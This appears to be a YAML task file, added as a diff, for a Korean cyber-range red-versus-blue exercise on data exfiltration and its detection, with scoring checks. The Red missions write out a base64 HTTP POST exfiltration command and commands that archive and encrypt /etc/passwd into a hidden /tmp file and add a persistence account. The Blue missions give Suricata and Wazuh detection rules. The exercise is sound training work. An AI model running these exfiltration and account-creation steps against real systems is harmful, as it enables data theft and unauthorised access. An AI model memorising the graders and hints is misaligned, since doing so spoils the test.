@@ -1,0 +1,238 @@
+id: "attack-adv-w10"
+category: "attack-adv"
+title: "[공격고급 W10] 데이터 유출 — 다채널 exfil vs DLP·유출 탐지"
+difficulty: "hard"
+time_limit: 3000
+battle_type: "1v1"
+description: |
+  공격 고급과정 10주차 — **데이터 유출(Exfiltration)**. 민감 데이터를 수집·암호화해 HTTP/DNS/ICMP/스테가노그래피/
+  분할 전송 등 다채널로 빼낸다. Red 는 유출을 시도하고, Blue 는 DNS 터널·대용량 업로드를 탐지하고 DLP 우회를 막는다.
+
+  ▸ 이야기
+    공격자가 민감 파일을 모아 암호화 아카이브(**`/tmp/.aa10exfil`**)로 스테이징하고, 태그 단 HTTP/DNS 채널로
+    유출을 시도한다(태그 `aa10r1`). 방어자는 유출 채널을 탐지하고 DLP 우회 기법을 분석한다.
+
+  ▸ 모드
+    • solo : 한 학생이 유출(자기 인프라 표적)과 탐지를 모두. 대상 = 본인 인프라.
+    • duel : Red 가 상대(Blue) 인프라에서 유출, Blue 는 자기 인프라에서 탐지.
+
+  ▸ 공격자 위치(중요)
+    Red 미션은 **attacker-ext(SSH 2203)** 기준. Red 채점은 **대상 인프라의 흔적(WAF audit 태그 / 스테이징 파일·계정)** 으로 한다.
+
+  ▸ 이번 주차 전용 마커
+    유출 태그 **`aa10r1-<본인id>`**, 암호화 스테이징 **`/tmp/.aa10exfil`**(마커 `aa10`), 계정 **`atka10`**,
+    Suricata 탐지 **sid 9710011**, Wazuh 탐지 **id 103101**. 종료 시 cleanup.
+
+red_missions:
+  - order: 1
+    assess_target: opponent
+    target_vm: web
+    points: 22
+    instruction: |
+      ## 🎯 RED-1 [HTTP/DNS 유출 시도] — 인코딩 데이터 반출
+
+      ### 상황
+      너는 수집 데이터를 Base64 인코딩해 HTTP POST(또는 DNS 서브도메인)로 빼낸다. 태그 `aa10r1-<본인id>` 를 달아
+      유출 시도가 대상 audit 에 귀속되게 한다.
+
+      ### 할 일 (attacker-ext)
+      예시(id=kim):
+      ```bash
+      DATA=$(echo 'secret-data aa10r1-kim' | base64)
+      curl -s -A "aa10r1-kim-exfil" -H "Host: dvwa.6v6.lab" \
+        --data "x=$DATA" "http://<대상_공개IP>/upload?tag=aa10r1-kim"
+      ```
+
+      ### 채점 방법
+      대상 WAF audit(modsec)에 태그 `aa10r1` 가 포함된 유출 시도가 남았는지로 채점.
+
+      ### 합격 기준
+      대상 WAF audit 에 `aa10r1` 태그가 포함된 유출 시도가 남는다.
+    hint: "태그(aa10r1) base64 HTTP POST 유출 → 대상 modsec audit. 채점: log_contains modsec aa10r1."
+    verify:
+      type: "log_contains"
+      expect: "aa10r1"
+      checks:
+        - { id: "red-1-1", type: "log_contains", target: "web",
+            params: { log: "modsec", pattern: "aa10r1", since_sec: 1800 } }
+      semantic:
+        intent: "데이터 유출(T1041 C2 채널 / T1048 대체 프로토콜) — HTTP/DNS 인코딩 반출. 대상 WAF audit, 태그(aa10r1) 귀속."
+        success_criteria:
+          - "대상 WAF audit 에 aa10r1 태그가 포함된 유출 시도"
+          - "유출 채널(HTTP/DNS)과 인코딩 방식 서술"
+        acceptable_methods:
+          - "attacker-ext 에서 태그 단 인코딩 유출"
+        negative_signs:
+          - "태그 누락 / 대상 미도달"
+
+  - order: 2
+    assess_target: opponent
+    target_vm: web
+    points: 18
+    instruction: |
+      ## 🎯 RED-2 [스테이징·암호화] — 반출 아카이브 + 계정
+
+      ### 상황
+      유출 전 단계로 민감 데이터를 모아 암호화 아카이브 **`/tmp/.aa10exfil`**(마커 `aa10`)로 스테이징하고, 계정
+      **`atka10`** 으로 지속 접근을 둔다.
+
+      ### 할 일
+      ```bash
+      tar czf - /etc/passwd /etc/hostname 2>/dev/null | openssl enc -aes-256-cbc -pbkdf2 -k aa10key -out /tmp/.aa10exfil 2>/dev/null
+      echo 'aa10 staged' >> /tmp/.aa10exfil
+      sudo useradd -m -s /bin/bash atka10
+      ```
+
+      ### 채점 방법
+      대상 호스트에 `/tmp/.aa10exfil`(마커 `aa10`)이 있거나 `/etc/passwd` 에 `atka10` 이 있는지로 채점.
+
+      ### 합격 기준
+      `/tmp/.aa10exfil`(마커 `aa10`) 또는 계정 `atka10`.
+    hint: "암호화 스테이징 /tmp/.aa10exfil (마커 aa10) + useradd atka10. 채점: file_contains exfil aa10 + file_contains passwd atka10."
+    verify:
+      type: "file_contains"
+      expect: "aa10"
+      checks:
+        - { id: "red-2-1", type: "file_contains", target: "web",
+            params: { path: "/tmp/.aa10exfil", pattern: "aa10" } }
+        - { id: "red-2-2", type: "file_contains", target: "web",
+            params: { path: "/etc/passwd", pattern: "atka10" } }
+      semantic:
+        intent: "데이터 스테이징(T1074) + 암호화(T1560) + 계정(T1136) — 반출 아카이브 준비."
+        success_criteria:
+          - "/tmp/.aa10exfil(마커 aa10) 또는 계정 atka10"
+          - "수집 데이터/암호화 방식과 반출 계획 서술"
+        acceptable_methods:
+          - "tar+openssl 스테이징 + useradd"
+        negative_signs:
+          - "흔적 미생성"
+
+blue_missions:
+  - order: 1
+    assess_target: self
+    target_vm: ips
+    points: 20
+    instruction: |
+      ## 🛡️ BLUE-1 [유출 채널 탐지] — Suricata 룰 (sid 9710011)
+
+      ### 상황
+      DNS 터널/대용량 업로드 등 유출 채널을 잡는 Suricata 룰(**sid 9710011**)을 만든다.
+
+      ### 할 일
+      ```
+      alert http any any -> any any (msg:"ATKADV-W10 data exfil over HTTP (base64 blob)"; flow:to_server; http.request_body; content:"base64"; nocase; sid:9710011; rev:1;)
+      ```
+      (DNS 터널 탐지는 긴 서브도메인/높은 TXT 빈도를 별도 룰로 보완.)
+      ```bash
+      sudo suricatasc -c reload-rules
+      ```
+
+      ### 채점 방법
+      ips 의 `local.rules` 에 sid 9710011 룰이 있는지로 확인.
+
+      ### 합격 기준
+      `local.rules` 에 유출 채널을 보는 sid 9710011 룰이 존재한다.
+    hint: "유출 채널 Suricata 룰(sid 9710011, HTTP base64/DNS 터널) → reload. 채점: file_contains local.rules 9710011."
+    verify:
+      type: "file_contains"
+      expect: "9710011"
+      checks:
+        - { id: "blue-1-1", type: "file_contains", target: "ips",
+            params: { path: "/etc/suricata/rules/local.rules", pattern: "9710011" } }
+      semantic:
+        intent: "유출 탐지(네트워크) — HTTP/DNS 유출 채널 Suricata 룰. 대용량 업로드/긴 서브도메인 신호."
+        success_criteria:
+          - "local.rules 에 sid 9710011"
+          - "HTTP 대용량/ DNS 터널 탐지 신호 서술"
+        acceptable_methods:
+          - "Suricata 룰 작성 + reload"
+        negative_signs:
+          - "패턴 부정확 / 문법 오류"
+
+  - order: 2
+    assess_target: self
+    target_vm: siem
+    points: 22
+    instruction: |
+      ## 🛡️ BLUE-2 [스테이징 탐지] — Wazuh 룰 (id 103101)
+
+      ### 상황
+      RED-2 의 스테이징 아카이브·계정 생성을 잡는 Wazuh 룰(**id 103101**)을 만든다.
+
+      ### 할 일
+      ```xml
+      <group name="edu,exfil,">
+        <rule id="103101" level="12">
+          <if_group>edu</if_group>
+          <match>atka10</match>
+          <description>ATKADV-W10 - exfil staging archive / account indicator</description>
+        </rule>
+      </group>
+      ```
+      ```bash
+      sudo /var/ossec/bin/wazuh-control restart
+      ```
+
+      ### 채점 방법
+      `local_rules.xml` 에 id 103101 룰이 있는지로 확인.
+
+      ### 합격 기준
+      `local_rules.xml` 에 스테이징/계정 지표를 보는 id 103101 룰이 존재한다.
+    hint: "스테이징/유출 Wazuh 룰(id 103101) → restart. 채점: file_contains local_rules.xml 103101."
+    verify:
+      type: "file_contains"
+      expect: "103101"
+      checks:
+        - { id: "blue-2-1", type: "file_contains", target: "siem",
+            params: { path: "/var/ossec/etc/rules/local_rules.xml", pattern: "103101" } }
+      semantic:
+        intent: "유출 탐지(호스트) — 스테이징 아카이브/계정 Wazuh 룰. 반출 전 단계 포착."
+        success_criteria:
+          - "local_rules.xml 에 rule id 103101"
+          - "스테이징/대용량 아카이브 탐지 로직"
+        acceptable_methods:
+          - "Wazuh 룰 작성 + restart"
+        negative_signs:
+          - "탐지 로직 부실 / XML 오류"
+
+  - order: 3
+    assess_target: self
+    target_vm: siem
+    points: 18
+    instruction: |
+      ## 🛡️ BLUE-3 [DLP 우회 분석·방어] — 채널 비교 + 유출 방어 전략
+
+      ### 상황
+      유출 채널별 **대역폭 vs 은닉성** 트레이드오프와 **DLP 우회** 기법을 분석하고, 유출 방어 전략(egress 필터링/
+      DNS 모니터링/DLP/데이터 분류)을 정리한다.
+
+      ### 할 일
+      보고서에:
+      - 채널별(HTTP/DNS/ICMP/스테가노/분할) 대역폭·은닉성 비교 + DLP 우회 기법
+      - 유출 방어 전략 + 스테이징(`/tmp/.aa10exfil`)·계정(atka10) 헌팅
+      ```bash
+      sudo tail -200 /var/ossec/logs/alerts/alerts.json | \
+        python3 -c 'import sys,json;[print(json.loads(l).get("rule",{}).get("id")) for l in sys.stdin if l.strip()]' | sort | uniq -c | sort -rn | head
+      ```
+
+      ### 채점 방법
+      본인 SIEM 에 최근 경보가 수집돼 있는지 + 제출한 DLP 우회 분석·방어 전략으로 채점.
+
+      ### 합격 기준
+      본인 SIEM 에 최근 경보가 있다(+ 채널 비교·DLP 우회·방어 전략·헌팅은 제출로 검증).
+    hint: "채널별 대역폭/은닉성 비교 + DLP 우회 + 방어(egress 필터/DNS 모니터/DLP/데이터 분류) + 스테이징/계정 헌팅. 채점: wazuh_alert + 제출."
+    verify:
+      type: "wazuh_alert"
+      expect: "alert"
+      checks:
+        - { id: "blue-3-1", type: "wazuh_alert", target: "siem", params: { since_sec: 1800 } }
+      semantic:
+        intent: "유출 분석·방어 — 채널 트레이드오프 + DLP 우회 + 방어 전략 + 헌팅. 분석형 — 구체 방어 제시 시 점수 상승."
+        success_criteria:
+          - "최근 경보 수집 확인"
+          - "채널별 대역폭/은닉성 비교 + DLP 우회 기법"
+          - "유출 방어 전략 + 스테이징/계정 헌팅"
+        acceptable_methods:
+          - "채널 비교표 + 방어 전략 + 헌팅"
+        negative_signs:
+          - "방어 전략 누락"
